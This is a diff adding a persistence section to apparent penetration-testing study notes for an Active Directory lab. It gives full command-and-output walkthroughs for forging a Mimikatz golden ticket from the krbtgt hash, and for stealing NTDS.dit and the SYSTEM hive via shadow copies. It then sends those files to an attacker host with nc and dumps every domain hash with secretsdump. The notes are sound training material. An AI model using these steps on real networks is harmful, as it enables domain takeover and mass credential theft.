@@ -567,3 +567,293 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 
 
 # Persistance
+
+Set of techniques used to maintain the attacker's foothold even after a reboot or cred change.
+
+>Note that in many real-world penetration tests or red-team engagements, persistence is not part of the scope due to the risk of incomplete removal once the assessment is complete.
+
+## Golden Ticket
+
+- Self-made, custom TGT
+	- Requires obtaining the `krbtgt` password hash
+- More powerful attack vector than Silver Tickets
+	- Silver tickets are for *a specific* service
+	- Gold tickets are for the *entire domain*
+
+>We must carefully protect stolen _krbtgt_ password hashes because they grant unlimited domain access.
+>Consider explicitly obtaining the client's permission before executing this technique
+
+##### Re-Kerberos Auth:
+- When a user submits a request for a TGT:
+	- KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
+		- Secret key = password hash of a domain user account called [_krbtgt_](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#Sec_KRBTGT).
+
+Best advantage is that the _krbtgt_ account password is not automatically changed.
+- Only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version
+
+>The [_Domain Functional Level_](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels) dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller.
+>Higher functional levels enable additional features, functionality, and security mitigations.
+
+
+- RDP into `client74` as `jen` & verify lack of access
+```powershell
+.\PsExec64.exe \\dc1 cmd.exe
+	PsExec v2.4 - Execute processes remotely
+	Copyright (C) 2001-2022 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+	
+	Couldn't access dc1:
+	Access is denied.
+```
+
+
+At this stage, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
+
+- Extract the password hash of the _krbtgt_ account with Mimikatz
+```powershell
+# mimikatz
+privilege::debug
+	Privilege '20' OK
+
+lsadump::lsa /patch
+	Domain : CLIENT74 / S-1-5-21-4060895957-195960390-4124122524
+	
+	RID  : 000001f4 (500)
+	User : Administrator
+	LM   :
+	NTLM :
+	
+	RID  : 000001f7 (503)
+	User : DefaultAccount
+	LM   :
+	NTLM :
+	
+	RID  : 000001f5 (501)
+	User : Guest
+	LM   :
+	NTLM :
+	
+	RID  : 000003e9 (1001)
+	User : offsec
+	LM   :
+	NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
+	
+	RID  : 000001f6 (502)
+	User : krbtgt
+	LM   :
+	NTLM : 1693c6cefafffc7af11ef34d1c788f47
+	
+	RID  : 000001f8 (504)
+	User : WDAGUtilityAccount
+	LM   :
+	NTLM : 6aea19f007238031deec323efe489037
+```
+
+
+Creating & injecting a golden ticket into memory
+- Doesn't req admin privs
+- Can be performed on a comp not domain joined
+
+
+- Delete any existing Kerberos tickets
+```powershell
+# mimikatz
+kerberos::purge
+	Ticket(s) purge for current session is OK
+```
+
+- Create golden ticket with `jen`'s domain SID (don't forget to drop the user ID at the end)
+	- Use the **/krbtgt** option instead of **/rc4** to indicate we are supplying the password hash of the _krbtgt_ user account
+```powershell
+whoami /user
+	USER INFORMATION
+	----------------
+	
+	User Name SID
+	========= =============================================
+	corp\jen  S-1-5-21-1987370270-658905905-1781884369-1124
+#  REMEMBER TO LOSE THE LAST 4 DIGITS (USER ID: 1124)
+
+# mimikatz
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+	User      : jen
+	Domain    : corp.com (CORP)
+	SID       : S-1-5-21-1987370270-658905905-1781884369
+	User Id   : 500
+	Groups Id : *513 512 520 518 519
+	ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
+	Lifetime  : 9/2/2024 7:39:07 AM ; 8/31/2034 7:39:07 AM ; 8/31/2034 7:39:07 AM
+	-> Ticket : ** Pass The Ticket **
+	
+	 * PAC generated
+	 * PAC signed
+	 * EncTicketPart generated
+	 * EncTicketPart encrypted
+	 * KrbCred generated
+	
+	Golden ticket for 'jen @ corp.com' successfully submitted for current session
+
+# open up a cmd prompt w/ ticket
+misc::cmd
+	Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF77477B800
+```
+
+- Can verify ticket
+```powershell
+klist
+	Current LogonId is 0:0x25c260
+	
+	Cached Tickets: (1)
+	
+	#0>     Client: jen @ corp.com
+	        Server: krbtgt/corp.com @ corp.com
+	        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+	        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+	        Start Time: 9/2/2024 7:29:23 (local)
+	        End Time:   8/31/2034 7:29:23 (local)
+	        Renew Time: 8/31/2034 7:29:23 (local)
+	        Session Key Type: RSADSI RC4-HMAC(NT)
+	        Cache Flags: 0x1 -> PRIMARY
+	        Kdc Called:
+```
+
+- Use **psexec** and the golden ticket to connect to `dc1` with `jen`
+```powershell
+.\PsExec64.exe \\dc1 cmd.exe
+	PsExec v2.4 - Execute processes remotely
+	Copyright (C) 2001-2022 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+	
+	
+	Microsoft Windows [Version 10.0.20348.887]
+	(c) Microsoft Corporation. All rights reserved.
+	
+	C:\Windows\system32>type C:\users\administrator\desktop\flag.txt
+		OS{fb8eaa4a1cbeb301de590318cdf58f05}
+```
+
+> Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID.
+> The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain.
+> The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.
+
+
+By creating our own TGT and then using PsExec, we are performing the _overpass the hash_ attack by leveraging Kerberos auth
+
+>If we were to connect PsExec to the IP address of the domain controller instead of the hostname,
+>we would instead force the use of NTLM authentication and access would still be blocked
+
+
+## Shadow Copies
+- aka Volume Shadow Service (VSS)
+- Backup tech allowing for creation of snapshots of files or entire volumes 
+
+**vshadow.exe**
+- Manages the volume shadow copies
+- Can be abused to create a Shadow Copy that allows us to extract the AD db [NTDS.dit](https://technet.microsoft.com/en-us/library/cc961761.aspx) file
+	- Need SYSTEM hive & can then extract every cred offline
+
+- RDP as `jeffadmin` to `dc1` & run utility from elevated cmd prompt
+```powershell
+powershell.exe
+Start-Process powershell.exe -Verb runAs
+
+# From C:\Tools
+vshadow.exe -nw -p C:
+	VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
+	Copyright (C) 2005 Microsoft Corporation. All rights reserved.
+	
+	(Option: No-writers option detected)
+	(Option: Persistent shadow copy)
+	(Option: Create shadow copy set)
+	- Setting the VSS context to: 0x00000019
+	Creating shadow set {523569da-46ad-42da-a45f-2bc4973bb890} ...
+	- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
+	Creating the shadow (DoSnapshotSet) ...
+	(Waiting for the asynchronous operation to finish...)
+	Shadow copy set succesfully created.
+	
+	List of created shadow copies:
+	
+	Querying all shadow copies with the SnapshotSetID {523569da-46ad-42da-a45f-2bc4973bb890} ...
+	
+	* SNAPSHOT ID = {8036aa87-9851-4106-aab1-eb64c8fef7c9} ...
+	   - Shadow copy Set: {523569da-46ad-42da-a45f-2bc4973bb890}
+	   - Original count of shadow copies = 1
+	   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
+	   - Creation Time: 9/2/2024 11:14:36 AM
+	   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2                 # --> NOTE DOWN
+	   - Originating machine: DC1.corp.com
+	   - Service machine: DC1.corp.com
+	   - Not Exposed
+	   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
+	   - Attributes:  No_Auto_Release Persistent No_Writers Differential
+	
+	Snapshot creation done.
+```
+	- -nw - Disable writers.  Speeds up process
+	- -p - Save copy to disk
+	- Take note of `Shadow copy device name`
+
+- Copy whole AD db from the shadow copy to the C: root
+```powershell
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+	1 file(s) copied.
+```
+
+- Save the SYSTEM hive from the reg
+```powershell
+reg.exe save hklm\system c:\system.bak
+	The operation completed successfully.
+```
+
+- Transfer the two files to kali w/ nc
+```powershell
+# Setup python web server on kali in folder w/ nc.exe
+python3 -m http.server 80
+
+# Switch to PS prompt and download nc.exe
+powershell
+iwr -uri http://192.168.228.45/nc.exe -Outfile nc.exe
+
+# In kali, setup multiple nc listeners to catch the files
+nc -nlvp 5555 > system.bak
+nc -nlvp 4444 > ntds.dit.bak
+
+# In Win, exit powershell and send files
+exit
+.\nc.exe 192.168.228.45 5555 < system.bak
+.\nc.exe 192.168.228.45 4444 < ntds.dit.bak
+```
+	- We exit PS for the use of nc.exe as `<` produces an error otherwise
+	- Not sure if process will work smoothly if transferring both at the same time.   Always safer to transfer files individually.
+
+- Extract creds w/ *secretsdump* from **impacket**
+```bash
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
+	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+	[*] Searching for pekList, be patient
+	[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
+	[*] Reading and decrypting hashes from ntds.dit.bak 
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eb9131bbcdafe388b4ed8a511493dfc6:::
+	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+	dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+	stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
+	jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
+	jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
+	iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
+	WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:6ce7a763842704c39101fea70b77a6bc:::
+	FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:024e0b5bc4f09a8f909813e2c5041a2c:::
+	...
+	[*] Cleaning up...
+```
+
+Can now either try to crack the hashes or use them as-is in PtH attacks
+
+>While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.
+>
+To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.
